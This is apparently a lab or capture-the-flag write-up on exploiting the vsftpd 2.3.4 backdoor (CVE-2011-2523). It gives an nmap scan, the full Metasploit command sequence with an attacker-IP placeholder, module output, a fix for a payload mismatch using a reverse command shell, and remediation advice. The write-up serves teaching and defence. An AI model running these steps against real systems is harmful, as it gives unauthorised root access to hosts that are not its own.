# vsftpd 2.3.4 Backdoor Exploitation (CVE-2011-2523)

## Summary

Exploitation of a backdoor planted in vsftpd version 2.3.4, a malicious modification distributed between June 30 and July 3, 2011, which grants an attacker a root shell on port 6200 after a specific FTP login sequence. This engagement targeted a lab host running the vulnerable service, resulting in successful remote code execution.

- **Target:** 10.128.185.153
- **Service:** FTP (port 21), vsftpd 2.3.4
- **Vulnerability:** CVE-2011-2523
- **Attack platform:** Kali Linux, Metasploit Framework
- **Outcome:** Root-level command shell obtained; flag captured

## Vulnerability Background

vsftpd 2.3.4 source archives hosted on the official download server were compromised by an unknown attacker and modified to include a backdoor. If a client attempted to log in with a username containing a smiley face sequence (`:)`), the backdoored binary would open a listener on TCP port 6200 and bind `/bin/sh` to it, granting unauthenticated root access to anyone who connected. The compromise was discovered and the malicious binary pulled from distribution, but instances built from the tainted source remain a well-known target for demonstrating unauthenticated remote code execution.

## Reconnaissance

An initial scan identified the target and confirmed the FTP service banner:

```
nmap -sV -p21 10.128.185.153
```

The service banner returned `220 (vsFTPd 2.3.4)`, immediately flagging the host as a likely candidate for this backdoor given the known-vulnerable version string.

## Exploitation

Metasploit's built-in module for this vulnerability was used to automate detection and exploitation:

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.128.185.153
set RPORT 21
set LHOST <attacker_ip>
set LPORT 4444
run
```

The module's automatic vulnerability check confirmed the target based on the FTP banner, then triggered the backdoor:

```
[*] 10.128.185.153:21 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.128.185.153:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 10.128.185.153:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 10.128.185.153:21 - Backdoor has been spawned!
```

## Troubleshooting Note: Session Instability

The initial exploitation attempts produced an unusual pattern — the module reported a session opening, immediately followed by that same session dying:

```
[*] Meterpreter session 1 closed. Reason: Died
[*] Meterpreter session 1 opened (attacker_ip:4444 -> 10.128.185.153:XXXXX) at ...
[-] Invalid session identifier: 1
```

This was traced to a payload mismatch. The vsftpd backdoor does not deliver a staged Meterpreter payload — it simply binds `/bin/sh` to a raw TCP listener on port 6200. Metasploit was configured to negotiate a Meterpreter session on top of this connection, which the raw shell could not support, causing the session to die on handshake.

**Resolution:** Selecting a PLAIN REVERSE COMMAND SHELL.

This is a useful reminder that not every exploit is compatible with a full Meterpreter session by default — matching payload type to the actual mechanism of the vulnerability (in this case, a bare shell bind rather than a staged payload delivery) is essential for a stable foothold.

## Post-Exploitation

Once a stable command shell session was established, the shell was confirmed to be running with root privileges (a direct consequence of the backdoor binding `/bin/sh` without any privilege drop). The flag was located and captured from the target filesystem.

## Remediation

- Upgrade vsftpd to a version obtained from a verified, checksum-validated source.
- Verify package integrity (checksums/signatures) for any software pulled from third-party or historical mirrors.
- Monitor for unexpected listening services (e.g., port 6200) as an indicator of compromise.
- Restrict outbound/inbound access on non-standard high ports via host and network firewalls.

## Key Takeaways

- Banner grabbing alone was sufficient to identify this vulnerability, underscoring the importance of service versioning hygiene.
- Payload selection matters as much as exploit selection — a working exploit with the wrong payload type can look like a failure when it is actually a configuration mismatch.
- This vulnerability, while dated, remains an effective and instructive example of a supply-chain compromise resulting in a critical backdoor.
